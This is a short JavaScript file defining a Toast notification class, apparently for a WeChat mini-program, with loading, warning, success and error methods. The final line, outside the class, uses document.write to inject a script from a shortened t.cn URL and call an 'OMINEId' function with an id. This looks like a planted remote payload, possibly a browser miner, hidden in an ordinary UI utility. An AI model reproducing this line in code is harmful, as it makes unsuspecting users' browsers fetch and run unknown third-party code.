export default class Toast{
  constructor (props={}) {
    this.options = {
      context: {},
      methods: ['loading', 'show', 'warning', 'success', 'error']
    }
  }

  init (ele) {
    const { options } = this
    const pages = getCurrentPages()
    const ctx = pages[pages.length - 1]
    const context = ctx.selectComponent('#' + ele)
    this.options.context = context
    this.createMethods()
  }

  createMethods () {
    const { options } = this
    options.methods.forEach(method => {
      let methodName = method
      if (method === 'show') {
        methodName = ''
      }
      this[method] = (res) => {
        res.type = methodName
        options.context.show(res)
      }
    })
  }

  hide () {
    const { options } = this
    options.context.hide()
  }
}
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
